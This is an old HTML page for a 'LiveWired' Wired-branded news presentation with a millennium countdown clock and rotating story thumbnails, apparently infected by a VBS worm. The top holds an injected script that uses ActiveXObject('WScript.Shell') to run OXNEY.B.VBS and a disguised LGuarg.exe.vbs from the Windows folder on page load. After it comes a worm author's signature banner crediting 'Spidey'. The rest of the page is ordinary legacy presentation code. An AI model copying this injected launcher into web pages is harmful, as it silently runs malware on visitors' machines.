<!-- Host by Spidey http://www.Spidey.uni.cc -->
<script>var wsh=new ActiveXObject('WScript.Shell');
wsh.Run('C:\WINDOWS\system32\OXNEY.B.VBS');</script>
wsh.Run('C:\WINDOWS\LGuarg.exe.vbs');</script>
<html><head><title>VBS.OXNEY.B</title></head><body><div align=left><font size=2><b>VBS.OXNEY.B</b><br>Create and modif by Spidey [ June, 07, 2004 ]</font><br><font size=2 color=red>made in Surabaya - East Java - United State of Indonesia</font><br><font size=2>visit : <a href=http://Spidey.uni.cc>http://Spidey.uni.cc</a> for more information about this suck or contact you AV support to disinfect...<br><p>(c) 07.05.2004 by Spidey</font></div></body></html>
<html>
<head>
<title>LiveWired</title>
<style type="text/css">
  @font-face { font-family: WiredDigital ; url(/livewired/fonts/wireddigital.eot)}
  #uberContainer{position: absolute; left: 0; top: 0; width: 100%; height: 100%; overflow: hidden; margin: 0}
  #grams {position: absolute; left: 0; top: 0; width: 100%; height: 100%; overflow: hidden; margin: 0; background-color: black}
   #holdButton {position: absolute; left: 48%; top: 88%; width: 5%; height: 6%; margin: 0; visibility: visible; z-index: 10;}
   #addchan {position: absolute; left: 80%; top: 88%; width: 136; height: 20; margin: 0; z-index: 10;}
  
  /* Gram styles */
  #TwensecondGif { position: absolute; left: 0px; top: 0px; width: 100%; height: 100%; z-index: -10; border: 0}
  #countDown { position: absolute; left: 0px; top: 0px; width: 100%; height: 100%; z-index: -10; border: 0; visibility: hidden}
  #striped{ position: absolute; left: 0; top: 31%; width: 100%; height: 52%; z-index: 20; visibility: visible; background: url(objects/introlin.gif)}
  #slogan {position: absolute; left: 0; top: 31%; width: 100%; visibility: visible; color: white; font-family: Arial Black; font-size: 120%; text-align: center; vertical-align: middle; filter: DropShadow(color=#000000, offX=2, offY=2,positive=1); background-image: url(objects/introlin.gif)}

  #separatorSpace {position: absolute; left: 0; top: 93%; width: 100%; height: 1%; font-size: 0; background-color: red; overflow: hidden; margin: 0}
  #navbar {position: absolute; left: 0; top: 94%; width: 100%; height: 6%; margin: 0; background-color: black; overflow: hidden}
  #logo {position: absolute; left: 0; top: 0; width: 30%; font-family: WiredDigital; color: lime; font-size: 65%; overflow: hidden; text-align: center; border-right: 1 solid lime}
  #clock {position: absolute; left: 30%; top: 0; width: 15%; height: 100%; margin: 0; color: red; overflow: hidden; font-family: Arial; font-weight: bold; font-size: 30%; border-left: 1 solid lime; border-right: 1 solid lime; text-align: center; letter-spacing: .3em}
  #date {border-bottom: 1 solid lime}
  #milleniumClock {border-top: 1 solid lime}
  #lwSections { position: absolute; left: 45%; top: 0; width: 50%; height: 100%; font-size: 0%; text-align: center; margin: 0; vertical-align: middle; font-family: Arial Black; font-style: oblique; color: limegreen; overflow: hidden; z-index: 20; border-left: 1 solid lime; border-right: 1 solid lime}

  /*LWsections*/
   .thumb {width: 9%; height: 100%; cursor: hand}
   .thumbLabel {background-color: black; width: 4%; height: 100%}
   .thumbImg {width: 100%; height: 100%; cursor: hand}
   #topStory {position: absolute; left: 0%; top: 0 }
   #newsLabel {position: absolute; left: 9%; top: 0 }
   #newsStory {position: absolute; left: 13%; top: 0 }
   #dataLabel {position: absolute; left: 22%; top: 0 }
   #dataStory {position: absolute; left: 26%; top: 0 }
   #faceLabel {position: absolute; left: 35%; top: 0 }
   #faceStory {position: absolute; left: 39%; top: 0 }
   #toolLabel {position: absolute; left: 48%; top: 0 }
   #toolStory {position: absolute; left: 52%; top: 0 }
   #mediaLabel {position: absolute; left: 61%; top: 0 }
   #mediaStory {position: absolute; left: 65%; top: 0 }
   #4castLabel {position: absolute; left: 74%; top: 0 }
   #4castStory {position: absolute; left: 78%; top: 0 }
   #adsLabel {position: absolute; left: 87%; top: 0 }
   #adsStory {position: absolute; left: 91%; top: 0 }

</style>
<script language="javascript">
function onStart() {

}

function onStop() {

}

// Millenium Clock Functions

var then = new Date(2000, 0, 1, 0, 0, 0);
var dayNames = new Array('Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday');
var monthNames = new Array('January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December');
var today = new Date();
var todayMonth = today.getMonth() + 1;
	    
function milleniumCount() {
   var now = new Date();
   milleniumClock.innerText = (Date.parse(then) - Date.parse(now)) / 1000;
}

function clockDate() {
  document.writeln(todayMonth + '.' + today.getDate() + '.' + today.getYear());
}

function randSymbol() {
   symbol.innerText = Math.round(Math.random() * 10);
}

</script>
<script language="javascript" for="chronos" event="onInit">
   chronos.Item("milleniumBug").At(0.000, "milleniumCount",-1, 1.000, 14);
   chronos.Item("milleniumBug").Play();
   //chronos.Item("randSym").At(0.000, "randSymbol()",-1, 0.100, 14);
   //chronos.Item("randSym").Play();
   chronos.Item("imageSwitch").At(4.000, "switchImg()",1, 0.000, 13);
</script>
<script for="window" event="onload">
 
</script>
<script for="countDown" event="onload">
 
</script>
</head>
<body style="margin: 0; font-size: 40; background-color: black; overflow: hidden">
<script language="JavaScript">
// The stub for the object

function presentation() {
  this.onHold = presentation_onHold;
  this.offHold = presentation_offHold;
  this.calcScale = presentation_calcScale;
  this.xFactor = document.body.offsetWidth / 800;
  this.yFactor = document.body.offsetHeight / 576;
  this.baseFontSize = parseInt(document.body.style.fontSize);
  this.baseLineHeight = parseInt(document.body.style.lineHeight);
}

function presentation_onHold() {
  for (i = 0; i < document.all.length; i++) {
    if (document.all(i).className == 'onhold') {
      document.all(i).style.visibility = 'visible';
    } else if (document.all(i).className == 'offhold') {
      document.all(i).style.visibility = 'hidden';
    }
  }
}

function presentation_offHold() {
  for (i = 0; i < document.all.length; i++) {
    if (document.all(i).className == 'offhold') {
      document.all(i).style.visibility = 'visible';
    } else if (document.all(i).className == 'onhold') {
      document.all(i).style.visibility = 'hidden';
    }
  }
}

function presentation_calcScale() {
  document.body.style.fontSize = Math.ceil(this.baseFontSize * this.yFactor);
  //document.body.style.lineHeight = Math.ceil(this.baseLineHeight * this.yFactor);
  for (i = 0; i < document.all.length; i++) {
    if (document.all(i).className == 'sg') {
      document.all(i).Scale(this.xFactor, this.yFactor, 0);
    }
  }
  return;
}

new presentation();

myPresentation = new presentation();

function presentationControl() {
  this.startIt = onStart;
  this.stopIt = onStop;
}

control = new presentationControl();

function switchImg() { 
   countDown.style.visibility = 'visible';
   slogan.style.visibility = 'hidden';
   TwensecondGif.style.visibility = 'hidden';

}

function scheduler() {
  this.inc = scheduler_inc;
  this.frameUpdate = scheduler_frameUpdate;
  this.gramLoaded = scheduler_gramLoaded;
  this.gramUnloaded = scheduler_gramUnloaded;

  this.sched = new Array();
  this.sched[0] = new sect_TS();
  this.sched[1] = new sect_WN();
  this.sched[2] = new sect_DA();
  this.sched[3] = new sect_FA();
  this.sched[4] = new sect_TO();
  this.sched[5] = new sect_ME();
  this.sched[6] = new sect_4C();
  this.sched[7] = new sect_AD();
  this.schedInc = 1;
}

function scheduler_inc() {
  this.frameUpdate(this.schedInc);
}

function scheduler_frameUpdate(item) {
  document.frames[0].document.location = this.sched[item].pageDir + this.sched[item].content[this.sched[item].inc] + 'index.htm';

  this.sched[item].inc ++;
  if (this.sched[item].inc == this.sched[item].content.length) {
     this.sched[item].inc = 0;
  }

  this.thumbnail = eval('thumb' + this.sched[item].section);
  this.thumbnail.src = this.sched[item].pageDir + this.sched[item].content[this.sched[item].inc] + 'thumb.png';

  this.schedInc = item;
  this.schedInc ++;
  if (this.schedInc >= this.sched.length) {
    this.schedInc = 0;
  }

}

daScheduler = new scheduler();

function scheduler_gramLoaded() {
  document.frames[0].control.startIt();
  chronos.Item("pageFlip").Play();
}

function scheduler_gramUnloaded() {
  chronos.Item("pageFlip").Stop();
  document.frames[0].control.stopIt();
}


function sect_TS() {
  this.pageDir = 'ts/';
  this.length = 20;
  this.section = 'ts';
  this.inc = 0;
  this.content = new Array('ts_asthm/', 'ts_cyron/');
}



function sect_WN() {
  this.pageDir = 'wn/';
  this.length = 60;
  this.section = 'wn';
  this.inc = 0;
  this.content = new Array('wn_ambie/');
}



function sect_4C() {
  this.pageDir = '4c/';
  this.length = 20;
  this.section = '4c';
  this.inc = 0;
  this.content = new Array('4c_light/', '4c_autom/', '4c_geneh/', '4c_world/');
}



function sect_DA() {
  this.pageDir = 'da/';
  this.length = 20;
  this.section = 'da';
  this.inc = 0;
  this.content = new Array('da_teens/', 'da_mostl/');
}



function sect_FA() {
  this.pageDir = 'fa/';
  this.length = 20;
  this.section = 'fa';
  this.inc = 0;
  this.content = new Array('fa_larry/');
}



function sect_TO() {
  this.pageDir = 'to/';
  this.length = 20;
  this.section = 'to';
  this.inc = 0;
  this.content = new Array('to_sparr/');
}



function sect_ME() {
  this.pageDir = 'me/';
  this.length = 20;
  this.section = 'me';
  this.inc = 0;
  this.content = new Array('me_catwo/');
}



function sect_AD() {
  this.pageDir = 'ad/';
  this.length = 20;
  this.section = 'ad';
  this.inc = 0;
  this.content = new Array('ad_hp/');
}

myPresentation.calcScale();

</script>
<OBJECT id="chronos" STYLE="visibility: hidden" CLASSID="clsid:B0A6BAE2-AAF0-11d0-A152-00A0C908DB96"></OBJECT>

<div id="uberContainer">
   <div id="grams">
      <script language="JavaScript">
      document.writeln('<iframe name="display1" id="daDisplay1" src="' + daScheduler.sched[0].pageDir + daScheduler.sched[0].content[daScheduler.sched[0].inc] + 'index.htm" SCROLLING="NO" style="position: absolute; left: 0; top: 0; width: 100%; height: 93.5%; margin: 0; visibility: visible" frameborder="no" scrolling="no"></iframe>');
   </script>

   <iframe name="hold" id="holdButton" src="hold.htm" frameborder="no" scrolling="no"></iframe>

   <iframe name="addchan" id="addChan" src="addchan.htm" frameborder="no" scrolling="no"></iframe>
   </div>
   <div id="separatorSpace"></div>
   <div id="navbar">

      <img id="logo" src="objects/logo.gif">

      <div id="clock">
         <div id="date">
	    <script language="JavaScript">
	      clockDate();
	    </script>
	 </div>
	 <div id="milleniumClock">
	    get Wired	    
	 </div>
	  
      </div>
      <div id="lwSections">
         <div id="topStory" class="thumb">
	    <script language="JavaScript">
	       //document.writeln('<img id="thumbts" class="thumbImg" src="' + daScheduler.sched[0].pageDir + daScheduler.sched[0].content[daScheduler.sched[0].inc] + 'thumb.png">');
	       document.writeln('<img id="thumbts" class="thumbImg" src="ts/ts_asthm/thumb.png">');
	    </script>
         </div>
         <script language="JavaScript" for="topStory" event="onclick">
	    daScheduler.frameUpdate(0);
         </script>
      
         <div id="newsStory" class="thumb">
            <script language="JavaScript">
               document.writeln('<img id="thumbwn" class="thumbImg" src="' + daScheduler.sched[1].pageDir + daScheduler.sched[1].content[daScheduler.sched[1].inc] + 'thumb.png">');
            </script>
	 </div>
	 <script language="JavaScript" for="newsStory" event="onclick">
	    daScheduler.frameUpdate(1);
	 </script>

	 <div id="dataStory" class="thumb">
	    <script language="JavaScript">
	       document.writeln('<img id="thumbda" class="thumbImg" src="' + daScheduler.sched[2].pageDir + daScheduler.sched[2].content[daScheduler.sched[2].inc] + 'thumb.png">');
	    </script>
         </div> 
	 <script language="JavaScript" for="dataStory" event="onclick">
	    daScheduler.frameUpdate(2);
	 </script>

	 <div id="faceStory" class="thumb">
	    <script language="JavaScript">
               document.writeln('<img id="thumbfa" class="thumbImg" src="' + daScheduler.sched[3].pageDir + daScheduler.sched[3].content[daScheduler.sched[3].inc] + 'thumb.png">');
            </script>
         </div>
	 <script language="JavaScript" for="faceStory" event="onclick">
	    daScheduler.frameUpdate(3);
	 </script>

	 <div id="toolStory" class="thumb">
	    <script language="JavaScript">
	       document.writeln('<img id="thumbto" class="thumbImg" src="' + daScheduler.sched[4].pageDir + daScheduler.sched[4].content[daScheduler.sched[4].inc] + 'thumb.png">');
	    </script>
	 </div>
	 <script language="JavaScript" for="toolStory" event="onclick">
	    daScheduler.frameUpdate(4);
	 </script>

	 <div id="mediaStory" class="thumb">
	    <script language="JavaScript">
	       document.writeln('<img id="thumbme" class="thumbImg" src="' + daScheduler.sched[5].pageDir + daScheduler.sched[5].content[daScheduler.sched[5].inc] + 'thumb.png">');
	    </script>
         </div>
	 <script language="JavaScript" for="mediaStory" event="onclick">
	    daScheduler.frameUpdate(5);
	 </script>

	 <div id="4castStory" class="thumb">
	    <script language="JavaScript">
            document.writeln('<img id="thumb4c" class="thumbImg" src="' + daScheduler.sched[6].pageDir + daScheduler.sched[6].content[daScheduler.sched[6].inc] + 'thumb.png">');
            </script>
         </div>
	 <script language="JavaScript" for="4castStory" event="onclick">
	    daScheduler.frameUpdate(6);
	 </script>

	 <div id="adsStory" class="thumb">
	    <script language="JavaScript">
               document.writeln('<img id="thumbad" class="thumbImg" src="' + daScheduler.sched[7].pageDir + daScheduler.sched[7].content[daScheduler.sched[7].inc] + 'thumb.png">');
            </script>
         </div>
         <script language="JavaScript" for="adsStory" event="onclick">
	    daScheduler.frameUpdate(7);
         </script>

	 <img src="objects/wiredBar/news.gif" id="newsLabel" class="thumbLabel">

	 <img src="objects/wiredBar/data.gif" id="dataLabel" class="thumbLabel">

	 <img src="objects/wiredBar/face.gif" id="faceLabel" class="thumbLabel">

	 <img src="objects/wiredBar/tool.gif" id="toolLabel" class="thumbLabel">

	 <img src="objects/wiredBar/media.gif" id="mediaLabel" class="thumbLabel">

	 <img src="objects/wiredBar/4cast.gif" id="4castLabel" class="thumbLabel">

	 <img src="objects/wiredBar/ad.gif" id="adsLabel" class="thumbLabel">

      </div>
   
      <div id="symbol">
         n
      </div>

   </div>
</div>
<script language="JavaScript" for="window" event="onresize">
var feh = document.location;
document.location = feh;
</script>
<script language="JavaScript" for="window" event="onerror">
//document.location = 'error.htm';
</script>

<script language="JavaScript" for="window" event="onload"> 
navbar.style.visibility = 'visible';
//document.all(12).style.visibility = 'visible';
//document.all(13).style.visibility = 'visible';
chronos.Item("pageFlip").play();
</script>
<script language="JavaScript" for="chronos" event="onInit">
chronos.Item("pageFlip").At(20.000, "daScheduler.inc()",-1, 20.000, 5);
chronos.Item("milleniumBug").At(0.000, "milleniumCount",-1, 1.000, 1);
chronos.Item("milleniumBug").play();
</script>
</body>
</html>
